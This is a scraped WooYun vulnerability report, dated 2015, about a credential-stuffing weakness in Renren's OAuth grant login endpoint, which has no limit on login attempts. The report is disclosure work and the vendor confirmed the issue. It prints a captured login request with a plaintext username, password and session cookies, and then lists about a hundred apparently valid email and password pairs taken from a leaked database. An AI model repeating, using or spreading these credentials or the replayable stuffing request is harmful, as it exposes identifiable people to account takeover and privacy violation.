{"id": 31895, "wybug_id": "wooyun-2015-0112812", "wybug_title": "某接口撞库泄露用户登录凭据(有批量账号证明)", "wybug_corp": "人人网", "wybug_author": "路人甲", "wybug_date": "2015-05-08 11:43", "wybug_open_date": "2015-06-22 13:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["撞库"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向公众公开  简要描述： 撞库扫号攻击已经是Top 10 Security Risks for 2014之一.撞库泄露用户隐私 详细说明：      三方认证的登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号。   登录接口抓包如下：https://graph.renren.com/oauth/grant\nPOST /oauth/grant HTTP/1.1Host: graph.renren.comConnection: closeContent-Length: 811Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://graph.renren.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://graph.renren.com/oauth/grant?client_id=6f74c7e44b824432835e70f0544013fb&redirect_uri=http%3A%2F%2Fpassport.baidu.com%2Fphoenix%2Faccount%2Fafterauth%3Fmkey%3D5fec5f70f3097022b2d86c338568de29&response_type=code&display=page&scope=publish_share+create_album+photo_upload+publish_blog+publish_checkin+publish_comment+publish_feed+read_user_album+read_user_blog+read_user_checkin+read_user_comment+read_user_feed+read_user_guestbook+read_user_invitation+read_user_like_history+read_user_message+read_user_notification+read_user_photo+read_user_status+send_invitation+send_message+status_update+write_guestbook&state=&secure=true&origin=00000&username=ddddd&error_code=4Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: anonymid=i9ea6gwi-brfc4d; depovince=GW; _r01_=1; __utma=151146938.1916745302.1431010087.1431010087.1431010087.1; __utmc=151146938; __utmz=151146938.1431010087.1.1.utmcsr=renren.com|utmccn=(referral)|utmcmd=referral|utmcct=/SysHome.do; jebe_key=e35dab7c-5844-44a6-82b9-e656fbb5b82f%7C0083196e9ea7095a9b38cfdeb7d12861%7C1431010451205%7C1%7C1431010452089; first_login_flag=1; loginfrom=syshome; ln_uact=litsand@qq.com; ln_hurl=http://hdn.xnimg.cn/photos/hdn521/20101109/2035/h_main_CXTM_2765000203bd2f75.jpg; jebecookies=40809c3b-2866-4ffb-a1b6-d70d40ea1ee4|||||; ick_login=77c42c1e-88cf-42de-ba77-326369bd0865; ick=9601b7e3-6d26-4d07-97d9-9280d9945d4bRA-Ver: 2.10.0RA-Sid: 7B9DD012-20150303-080129-82895f-fb68a9AlexaToolbar-ALX_NS_PH: AlexaToolbar/alxg-3.3login_type=false&username=huanlingyun_1984@163%2ecom&password=19840801&icode=&isNeedIcode=&authFeed=true&follow=true&porigin=80100&redirect_uri=http%3A%2F%2Fpassport.baidu.com%2Fphoenix%2Faccount%2Fafterauth%3Fmkey%3D5fec5f70f3097022b2d86c338568de29&client_id=6f74c7e44b824432835e70f0544013fb&response_type=code&scope=publish_share+create_album+photo_upload+publish_blog+publish_checkin+publish_comment+publish_feed+read_user_album+read_user_blog+read_user_checkin+read_user_comment+read_user_feed+read_user_guestbook+read_user_invitation+read_user_like_history+read_user_message+read_user_notification+read_user_photo+read_user_status+send_invitation+send_message+status_update+write_guestbook&state=&display=page&post_form_id=98ac067daf88e93c580b747c6b3e9123-30-1431053111294&authorizeOrigin=00000&secure=true\n   漏洞证明：  经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.由于之前没有保存记录。又跑了一次。大部分账号都触发锁定策略了。。跑了一万5成功7百多，可见renren注册会员还是相当多啊。\nliuqiang_xq@126.com\txq19900809864466981@qq.com\tYang5845211314baobaoaixian@163.com\t124052338xizhi0606@yahoo.com.cn\t1301248118qslsist@163.com\tqushuliang0426suenjiebao@tom.com\t11091109lvqian0425@126.com\twoaimamazhangxinjungansu@126.com\tzhanggeorgechinagiggs2007@yahoo.com.cn\tag127valzhangzhezhi@gmail.com\tzzzhui123jonioncc@163.com\tsmilernihaobingzhi666@163.com\tzyqnihao1314521183059067@qq.com\tbecky362329504891636@qq.com\t5211314319wuyi8702@126.com\twuyi8702liujian313712@163.com\tqq123456lovmi827@sina.com\tyfj827319malcolm_1394@MSCampus.cn\t11111111174928883@qq.com\tqiaolin911576102320@qq.com\twangshuo416643834@qq.com\tcaidianyingaikuaixiaodemao@163.com\tmaomao41421137477747@qq.com\tzhongai131124062580@qq.com\t59305611yangyibo999@163.com\t124592203zuowenliangmail@sina.com\t85481076hikaru211@126.com\ts@iDreamhbbdlhw@126.com\tup369com727655032@qq.com\tqpl1qpl1290769069@qq.com\t258468895canxue945@163.com\t13580617139huang28163336@yahoo.com.cn\thuang55431huangdexin83@163.com\t813813813375971709@qq.com\t83030545chen123qaz@163.com\t11709352hzstan@163.com\t27821195lovejin1013@sina.com\t85918725lovejinjhl0623@gmail.com\t19860623zzlfinal@yahoo.com.cn\t19770722zhz49552078@163.com\tzhz13934157016quanquan_1101@126.com\t13469847409911107zj@sina.com\t19820920zozozozoz@126.com\t19871208alancy14@qq.com\tsandy1234153227972@qq.com\tyangjia1234sjt820809@163.com\t1982080971872642@qq.com\t87831411gwxarc@hotmail.com\t072324aa5364097@163.com\t6633270692lilinming2004@163.com\t19850416gpjzt123@163.com\t87334967shengri19880515@126.com\tshengri19880515cyxcxycyx@163.com\tcyxcxycyx4321chenjinmyin@qq.com\tcheng911chengshibaiduqiang@163.com\tqiang477577609920053@qq.com\t526201344409298743@QQ.COM\tluocan16816888yanzhongsheng@126.com\t198552200jingjingweiwei2007@yeah.net\twei195411128yxf128@sina.com\t0126530334yxx293448308@qq.com\tLWZL139791songyu12321@sina.com\tsy21808362199kaixinxiaoyu@163.com\t2199kaixinxiaoyuzhulaosi001@163.com\t24248423linken1989@126.com\tn19880308nxgjsky@vip.qq.com\tzygy564335xiaogaoyushizhu@126.com\t198610102418agnes.lee@yeah.net\t159357qtoetukamendeqingren@sohu.com\tkamendeqing1984165032704@qq.com\t58929176q258z258m258@163.com\t15849064661qzmluwei221@126.com\tlubingquandingzg168@qq.com\t19086763qq153998056@163.com\t153998056ding450616144@qq.com\ta34416912wangluozhixing2005@126.com\t79981134919438088@qq.com\tqq63426084whatpity210@yahoo.com.cn\twanqin210hejiafeng98@sina.com\thejiafeng98top-solo@163.com\tsnaketopba1ham@163.com\tba0630hamxiaoshufen2008@163.com\t13972688068278696436@qq.com\tliujia198911271040410808@qq.com\tzxcvb123shijian.chen@hotmail.com\tabiange2009735642992@qq.com\tqiujin5201314472622322@qq.com\tjia368495lzalmy@126.com\tliuzhe123xiangyang2006@163.com\tzhuchijuzhangyaling_ai@163.com\t19870623zylorobxof@163.com\t27930333lxs2liweilxs@163.com\tlw198718leiyangai1978@sina.com\t13887295120lya\n\n\n   修复方案：  撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-05-08 13:21 厂商回复： 谢谢，非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}